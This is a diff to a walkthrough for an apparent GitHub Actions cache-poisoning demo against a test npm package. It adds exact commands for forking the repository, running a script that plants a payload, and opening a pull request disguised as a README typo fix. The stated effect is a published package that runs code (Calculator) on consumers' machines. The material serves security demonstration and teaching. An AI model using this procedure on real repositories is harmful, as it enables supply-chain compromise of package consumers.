@@ -4,6 +4,36 @@ You are the attacker. The target is `cache-poisoning-pwn-demo` on the public npm
 
 This walkthrough is the real attack. By the end, npm will host a version of the package that opens Calculator (or any other arbitrary code) on every consumer's machine.
 
+## TL;DR — exact commands
+
+Run **from a terminal authenticated as your attacker account** (not the maintainer). The attack must originate from a clone of *your fork*, not the maintainer's repo — `apply-attack.sh` refuses to run if `origin` points upstream.
+
+```bash
+# 0. Confirm you're the attacker in this shell.
+gh auth status                 # must show <attacker-account> as active
+
+# 1. Fork upstream onto the attacker account (one-time per demo cycle).
+gh repo fork lullu57/gh-actions-demo-cache-poisoning --clone=false
+
+# 2. Clone the fork to a separate path (one-time; the fork is reused across runs).
+git clone https://github.com/<attacker-account>/gh-actions-demo-cache-poisoning /tmp/attacker-fork
+cd /tmp/attacker-fork
+
+# 3. Plant the payload on a fresh timestamped branch, commit, and push to your fork.
+bash ~/Repositories/gh-actions-demo-cache-poisoning/attack/fork-changes/apply-attack.sh --push
+
+# 4. Open the PR against upstream main using the gh command the script printed.
+#    (Example shape — the script prints the real one with your branch name.)
+gh pr create --repo lullu57/gh-actions-demo-cache-poisoning \
+  --head <attacker-account>:docs/fix-typo-<timestamp> \
+  --base main \
+  --title 'docs: fix typo in README' --body 'tiny readme fix'
+```
+
+The chain detonates when the maintainer next pushes any commit to `main`. Calculator opens for every consumer who then installs the package.
+
+The narrated, step-by-step version of all of this is below.
+
 ## What you control
 
 - A GitHub account (your "attacker" account — not the maintainer's).
